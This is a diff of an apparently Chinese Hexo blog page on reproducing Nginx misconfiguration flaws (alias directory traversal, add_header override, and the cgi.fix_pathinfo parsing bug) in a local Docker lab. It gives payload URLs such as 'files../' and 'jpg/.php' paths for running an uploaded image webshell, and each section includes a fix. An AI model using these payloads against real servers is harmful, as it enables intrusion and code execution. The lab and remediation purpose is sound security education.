+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问files目录，构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.150:8081/files</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/07/31/nginx-lou-dong-fu-xian/8.png" alt=""></p>
+<p>目录穿越到根目录,构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.150:8081/files../</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/07/31/nginx-lou-dong-fu-xian/9.png" alt=""></p>
 <p>此处留下一个疑问，能不能穿越到其他目录？？？</p>
-<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>将/加在files后：</p>
-<pre><code>location /files/ {
-    alias /home/;
-}
-</code></pre><h2 id="add-header被覆盖"><a href="#add-header被覆盖" class="headerlink" title="add_header被覆盖"></a>add_header被覆盖</h2><h3 id="漏洞说明-4"><a href="#漏洞说明-4" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>Nginx配置文件子块（server、location、if）中的 <code>add_header</code> ，将会覆盖父块中的 <code>add_header</code> 添加的HTTP头，造成一些安全隐患。</p>
-<p>如下列代码，整站（父块中）添加了CSP头：</p>
-<pre><code>add_header Content-Security-Policy &quot;default-src &#39;self&#39;&quot;;
-add_header X-Frame-Options DENY;
-
-location = /test1 {
-    rewrite ^(.*)$ /xss.html break;
-}
-
-location = /test2 {
-    add_header X-Content-Type-Options nosniff;
-    rewrite ^(.*)$ /xss.html break;
-}
-</code></pre><p>但<code>/test2</code>的location中又添加了 <code>X-Content-Type-Options</code> 头，导致父块中的 <code>add_header</code> 全部失效</p>
+<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>将/加在files后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /files/ &#123;</span><br><span class="line">	alias /home/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="add-header被覆盖"><a href="#add-header被覆盖" class="headerlink" title="add_header被覆盖"></a>add_header被覆盖</h2><h3 id="漏洞说明-4"><a href="#漏洞说明-4" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>Nginx配置文件子块（server、location、if）中的 <code>add_header</code> ，将会覆盖父块中的 <code>add_header</code> 添加的HTTP头，造成一些安全隐患。</p>
+<p>如下列代码，整站（父块中）添加了CSP头：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add_header Content-Security-Policy &quot;default-src &apos;self&apos;&quot;;</span><br><span class="line">add_header X-Frame-Options DENY;</span><br><span class="line"></span><br><span class="line">location = /test1 &#123;</span><br><span class="line">    rewrite ^(.*)$ /xss.html break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location = /test2 &#123;</span><br><span class="line">    add_header X-Content-Type-Options nosniff;</span><br><span class="line">    rewrite ^(.*)$ /xss.html break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>但<code>/test2</code>的location中又添加了 <code>X-Content-Type-Options</code> 头，导致父块中的 <code>add_header</code> 全部失效</p>
 <p><img src="/2019/07/31/nginx-lou-dong-fu-xian/10.png" alt=""></p>
 <h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="漏洞说明-5"><a href="#漏洞说明-5" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>Nginx解析漏洞是由于Nginx中php配置不当而造成的，与Nginx版本无关，但在高版本的php中，由于“security.limit_extensions”的引入，使得该漏洞难以被成功利用。</p>
-<p>当用户请求的url后缀为123.jpg/123.php时，location对请求进行选择的时候会使用URI环境变量进行选择，其中传递到后端Fastcgi的关键变量SCRIPT_FILENAME由Nginx生成的$fastcgi_script_name决定。</p>
-<pre><code>location ~ \.php$ {
-        fastcgi_index index.php;
-
-        include fastcgi_params;
-
-        fastcgi_param  REDIRECT_STATUS    200;
-        fastcgi_param  SCRIPT_FILENAME /var/www/html$fastcgi_script_name;
-        fastcgi_param  DOCUMENT_ROOT /var/www/html;
-        fastcgi_pass php:9000;
-    }
-</code></pre><p>而为了较好的支持PATH_INFO的提取，在PHP的配置选项里存在cgi.fix_pathinfo选项，其目的是为了从SCRIPT_FILENAME里取出真正的脚本名。<br>一般情况下cgi.fix_pathinfo的值默认为1，也就是开启，从而引发该漏洞。当Nginx遇到文件路径“123.jpg/123.php”时，由于其后缀为.php文件，所以会被传到上述所示代码中，在查找文件时，若“123.jpg/123.php”不存在，则会去掉最后的“123.php”，然后判断“123.jpg”是否存在，若存在，则把“123.jpg”当做php解析。</p>
-<h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code>docker-compose up -d
-</code></pre><p>靶机IP： <code>192.168.220.151</code></p>
+<p>当用户请求的url后缀为123.jpg/123.php时，location对请求进行选择的时候会使用URI环境变量进行选择，其中传递到后端Fastcgi的关键变量SCRIPT_FILENAME由Nginx生成的$fastcgi_script_name决定。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">		fastcgi_index index.php;</span><br><span class="line"></span><br><span class="line">		include fastcgi_params;</span><br><span class="line"></span><br><span class="line">		fastcgi_param  REDIRECT_STATUS    200;</span><br><span class="line">		fastcgi_param  SCRIPT_FILENAME /var/www/html$fastcgi_script_name;</span><br><span class="line">		fastcgi_param  DOCUMENT_ROOT /var/www/html;</span><br><span class="line">		fastcgi_pass php:9000;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>而为了较好的支持PATH_INFO的提取，在PHP的配置选项里存在cgi.fix_pathinfo选项，其目的是为了从SCRIPT_FILENAME里取出真正的脚本名。<br>一般情况下cgi.fix_pathinfo的值默认为1，也就是开启，从而引发该漏洞。当Nginx遇到文件路径“123.jpg/123.php”时，由于其后缀为.php文件，所以会被传到上述所示代码中，在查找文件时，若“123.jpg/123.php”不存在，则会去掉最后的“123.php”，然后判断“123.jpg”是否存在，若存在，则把“123.jpg”当做php解析。</p>
+<h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>靶机IP： <code>192.168.220.151</code></p>
 <p><img src="/2019/07/31/nginx-lou-dong-fu-xian/11.png" alt=""></p>
 <p>这是一个文件上传页面，我们先写一个phpinfo函数，将其保存为test1.jpg，上传该文件，页面响应如下：</p>
 <p><img src="/2019/07/31/nginx-lou-dong-fu-xian/12.png" alt=""></p>
 <p>抓包更改后，文件被重命名，并上传成功！</p>
 <p><img src="/2019/07/31/nginx-lou-dong-fu-xian/13.png" alt=""></p>
 <p>接下来我们去尝试访问该文件，文件打不开</p>
-<p>根据文件解析漏洞，我们构造payload格式如下：</p>
-<pre><code>http://192.168.220.151/uploadfiles/重命名.jpg/.php
-</code></pre><p>或</p>
-<pre><code>http://192.168.220.151/uploadfiles/重命名.jpg/重命名.php
-</code></pre><p><img src="/2019/07/31/nginx-lou-dong-fu-xian/14.png" alt=""></p>
+<p>根据文件解析漏洞，我们构造payload格式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.151/uploadfiles/重命名.jpg/.php</span><br></pre></td></tr></table></figure></p>
+<p>或<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.151/uploadfiles/重命名.jpg/重命名.php</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/07/31/nginx-lou-dong-fu-xian/14.png" alt=""></p>
 <p>这里可以直接上传图片马。</p>
 <h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol>
-<li>修改php.ini，设置<pre><code>cgi.fix_pathinfo = 0
-</code></pre></li>
-<li>在Nginx的配置文件中添加<pre><code>if ( $fastcgi_script_name ~ ..&amp;/.*php ) {
- return 403;
-}
-</code></pre></li>
-<li>前两种方法可能会导致一些伪静态网页或者特殊的路径无法显示。第三种方法将以下代码写在fcgi.conf文件中<pre><code>if ($request_filename ~* (.*).php) {
- set $php_url $1;
-}
-if (!-e $php_url.php) {
- return 403;
-}
-</code></pre>参考：<a href="https://www.cnblogs.com/dami520/archive/2012/08/22/2651113.html" target="_blank" rel="noopener">https://www.cnblogs.com/dami520/archive/2012/08/22/2651113.html</a></li>
+<li><p>修改php.ini，设置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cgi.fix_pathinfo = 0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在Nginx的配置文件中添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( $fastcgi_script_name ~ ..&amp;/.*php ) &#123;</span><br><span class="line">	return 403;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>前两种方法可能会导致一些伪静态网页或者特殊的路径无法显示。第三种方法将以下代码写在fcgi.conf文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ($request_filename ~* (.*).php) &#123;</span><br><span class="line">    set $php_url $1;</span><br><span class="line">&#125;</span><br><span class="line">if (!-e $php_url.php) &#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>参考：<a href="https://www.cnblogs.com/dami520/archive/2012/08/22/2651113.html" target="_blank" rel="noopener">https://www.cnblogs.com/dami520/archive/2012/08/22/2651113.html</a></p>
+</li>
 </ol>
 
   </div>
